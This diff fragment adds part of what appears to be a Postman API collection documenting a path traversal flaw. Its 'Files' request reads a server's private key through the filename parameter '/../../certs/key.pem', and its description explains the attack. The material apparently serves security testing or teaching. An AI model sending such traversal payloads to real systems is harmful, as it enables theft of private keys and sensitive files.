+									"listen": "test",
+									"script": {
+										"exec": [
+											"let response = pm.response.json();",
+											"pm.environment.set(\"access-token\", response.access);",
+											""
+										],
+										"type": "text/javascript",
+										"packages": {}
+									}
+								}
+							],
+							"request": {
+								"auth": {
+									"type": "noauth"
+								},
+								"method": "POST",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n  \"email\": \"{{user1-email}}\",\n  \"pan\": \"{{user1-pan}}\"\n}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "{{baseURL}}/auth/login",
+									"host": [
+										"{{baseURL}}"
+									],
+									"path": [
+										"auth",
+										"login"
+									]
+								}
+							},
+							"response": []
+						},
+						{
+							"name": "Files",
+							"protocolProfileBehavior": {
+								"disableBodyPruning": true
+							},
+							"request": {
+								"method": "GET",
+								"header": [],
+								"body": {
+									"mode": "raw",
+									"raw": "{\n    \"url\": \"https://file-examples.com/wp-content/storage/2017/10/file-sample_150kB.pdf\"\n}",
+									"options": {
+										"raw": {
+											"language": "json"
+										}
+									}
+								},
+								"url": {
+									"raw": "{{baseURL}}/account/files?filename=/../../certs/key.pem",
+									"host": [
+										"{{baseURL}}"
+									],
+									"path": [
+										"account",
+										"files"
+									],
+									"query": [
+										{
+											"key": "filename",
+											"value": "/../../certs/key.pem"
+										}
+									]
+								}
+							},
+							"response": []
+						}
+					],
+					"description": "The filename property for the GET files endpoint is vulnerable to path traversal attacks.\n\nA malicious user is allowed to insert the ../ sequence to force the API to navigate to other directories on the server and return potentially sensitive files."
+				}
+			]
+		}
+	],
+	"auth": {
+		"type": "bearer",
+		"bearer": [
+			{
+				"key": "token",
+				"value": "{{access-token}}",
+				"type": "string"
+			}
+		]
+	},
+	"event": [
+		{
+			"listen": "prerequest",
+			"script": {
+				"type": "text/javascript",
+				"packages": {},
+				"exec": [
+					""
+				]
+			}
+		},
+		{
+			"listen": "test",
+			"script": {
+				"type": "text/javascript",
+				"packages": {},
+				"exec": [
+					""
+				]
+			}
+		}
+	]
+}
